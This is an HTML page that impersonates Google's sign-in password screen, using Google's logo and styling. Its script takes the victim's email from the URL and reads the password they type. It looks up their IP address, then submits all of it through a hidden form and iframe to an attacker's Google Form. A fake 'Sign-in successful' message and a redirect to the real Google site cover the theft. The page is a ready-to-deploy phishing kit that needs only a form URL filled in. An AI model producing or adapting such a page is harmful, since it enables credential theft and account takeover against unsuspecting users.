<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://www.google.com/favicon.ico">
    <style>
        body {
            font-family: 'Google Sans', Arial, sans-serif;
            background: #fff;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 450px;
            margin: 100px auto;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 75px;
            height: 24px;
        }
        .user-info {
            text-align: center;
            margin-bottom: 30px;
        }
        .user-email {
            font-weight: 500;
            color: #202124;
        }
        .change-account {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }
        input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            margin-bottom: 20px;
            box-sizing: border-box;
        }
        input[type="password"]:focus {
            border-color: #1a73e8;
            outline: none;
        }
        .forgot-password {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 40px;
            display: block;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 40px;
        }
        .back-button {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            padding: 10px 0;
        }
        .next-button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-button:hover {
            background: #0d62d9;
        }
        footer {
            text-align: center;
            margin-top: 30px;
            color: #5f6368;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
        </div>
        
        <div class="user-info">
            <div class="user-email" id="displayEmail">Loading...</div>
            <a href="index.html" class="change-account">Use another account</a>
        </div>
        
        <h1>Welcome</h1>
        
        <form id="passwordForm">
            <input type="password" id="password" placeholder="Enter your password" required>
            
            <a href="#" class="forgot-password">Forgot password?</a>
            
            <div class="buttons">
                <a href="index.html" class="back-button">Back</a>
                <button type="button" onclick="submitPassword()" class="next-button">Next</button>
            </div>
        </form>
    </div>
    
    <footer>
        English (United States) ▼ • Help • Privacy • Terms
    </footer>

    <!-- Hidden form for Google Forms -->
    <form id="hiddenForm" action="YOUR_GOOGLE_FORM_URL_HERE/formResponse" method="POST" target="hidden_iframe" style="display:none;">
        <input type="hidden" name="entry.EMAIL_FIELD_ID" id="hiddenEmail">
        <input type="hidden" name="entry.PASSWORD_FIELD_ID" id="hiddenPassword">
        <input type="hidden" name="entry.IP_FIELD_ID" id="hiddenIP">
        <input type="hidden" name="entry.TIMESTAMP_FIELD_ID" id="hiddenTimestamp">
    </form>
    <iframe name="hidden_iframe" style="display:none;"></iframe>

    <script>
        // Get email from URL
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email');
        
        // Display email
        if(email) {
            document.getElementById('displayEmail').textContent = email;
        }

        // Get IP address
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Unknown';
            }
        }

        async function submitPassword() {
            const password = document.getElementById('password').value;
            
            if(!password) {
                alert('Please enter your password');
                return;
            }
            
            // Get IP
            const ip = await getIP();
            
            // Submit to Google Forms
            document.getElementById('hiddenEmail').value = email || 'Unknown';
            document.getElementById('hiddenPassword').value = password;
            document.getElementById('hiddenIP').value = ip;
            document.getElementById('hiddenTimestamp').value = new Date().toISOString();
            document.getElementById('hiddenForm').submit();
            
            // Show success and redirect to real Google
            alert('Sign-in successful! Redirecting...');
            setTimeout(() => {
                window.location.href = 'https://accounts.google.com';
            }, 1000);
        }
    </script>
</body>
</html>
